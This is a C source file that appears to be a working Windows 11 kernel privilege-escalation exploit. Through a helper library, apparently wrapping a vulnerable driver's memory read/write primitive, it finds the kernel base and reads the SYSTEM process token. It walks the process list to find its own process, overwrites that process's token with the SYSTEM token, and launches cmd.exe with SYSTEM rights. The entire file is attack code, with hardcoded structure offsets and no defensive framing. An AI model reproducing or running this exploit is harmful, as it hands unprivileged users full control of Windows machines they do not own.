#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include <lsapi.h>
#pragma comment(lib, "lsapi.lib")

//
// Windows 11 25H2 (OS Build 26200.9457)
//

#define _EPROCESS_UniqueProcessId       0x1D0
#define _EPROCESS_ActiveProcessLinks    0x1D8
#define _EPROCESS_Token                 0x248

INT
main (
    VOID
    )
{
    PLIST_ENTRY ActiveProcessEntry;
    LIST_ENTRY ActiveProcessLinks;
    ULONG CurrentProcessId;
    ULONG64 NtOsKrnlBase;
    ULONG64 NtOsKrnlUser;
    ULONG64 Process;
    ULONG64 PsInitialSystemProcess;
    ULONG64 PsInitialSystemProcessRva;
    ULONG64 PsInitialSystemProcessToken;
    WINNOTIFY_READ_VIRTUAL_MEMORY ReadVmRequest;
    BOOLEAN Status;
    ULONG64 UniqueProcessId;

    CurrentProcessId = GetCurrentProcessId();

    Status = LsInitialize();
    if (Status == FALSE) {
        return -1;
    }

    NtOsKrnlUser = LoadLibraryExW(
                            L"ntoskrnl.exe",
                            0,
                            DONT_RESOLVE_DLL_REFERENCES);

    if (NtOsKrnlUser == 0) {
        return -1;
    }

    NtOsKrnlBase = LsGetKernelModuleBase("ntoskrnl.exe");
    if (NtOsKrnlBase == 0) {
        return -1;
    }

    printf("> NtOsKrnl at %llx\n", NtOsKrnlBase);

    PsInitialSystemProcess = GetProcAddress(
                                    NtOsKrnlUser,
                                    "PsInitialSystemProcess");

    if (PsInitialSystemProcess == 0) {
        return -1;
    }

    //
    // Read the value pointed by PsInitialSystemProcess and retrieve
    // the Token value.
    //

    PsInitialSystemProcessRva = PsInitialSystemProcess - NtOsKrnlUser;

    LsReadVirtualMemory(
                NtOsKrnlBase + PsInitialSystemProcessRva,
                &ReadVmRequest);

    PsInitialSystemProcess = *(ULONG64*)&ReadVmRequest.Data[0];

    printf("> PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);

    //
    // .text:0000000140001BED:
    // if(!(v27 = *(_OWORD *)(Offset + *(_QWORD *)StructBuffer + 0x10))) return;
    // 
    // What the fuck is this code.. schizo code?
    // We need a work around, so we'll use -0x10 & +0x10 offsets.
    // The issue is that we'll lose 8 bytes that could be read.
    //

    LsReadVirtualMemory(
                PsInitialSystemProcess + _EPROCESS_Token - 0x10,
                &ReadVmRequest);

    PsInitialSystemProcessToken = *(ULONG64*)&ReadVmRequest.Data[0x10];

    printf("> System Token: %llx\n", PsInitialSystemProcessToken);

    LsReadVirtualMemory(
                PsInitialSystemProcess + _EPROCESS_ActiveProcessLinks - 0x10,
                &ReadVmRequest);

    ActiveProcessLinks = *(LIST_ENTRY*)&ReadVmRequest.Data[0x10];

    //
    // Yolo code for real.
    //

    // while (ActiveProcessEntry !=
    //       (PLIST_ENTRY)(PsInitialSystemProcess + _EPROCESS_ActiveProcessLinks))
    ActiveProcessEntry = ActiveProcessLinks.Flink;
    while (1) {
        Process = (ULONG64)ActiveProcessEntry - _EPROCESS_ActiveProcessLinks;

        LsReadVirtualMemory(
                    Process + _EPROCESS_UniqueProcessId,
                    &ReadVmRequest);

        UniqueProcessId = *(ULONG64*)&ReadVmRequest.Data[0];
        if (UniqueProcessId == CurrentProcessId) {
            LsWriteVirtualMemory(
                        Process + _EPROCESS_Token,
                        &PsInitialSystemProcessToken,
                        sizeof(ULONG64));
            break;
        }

        LsReadVirtualMemory((ULONG64)ActiveProcessEntry - 0x10, &ReadVmRequest);
        
        ActiveProcessEntry = (PLIST_ENTRY)*(ULONG64*)&ReadVmRequest.Data[0x10];
    }

    printf("> done!\n");

    system("cmd.exe");

    LsUninitialize();

    return 0;
}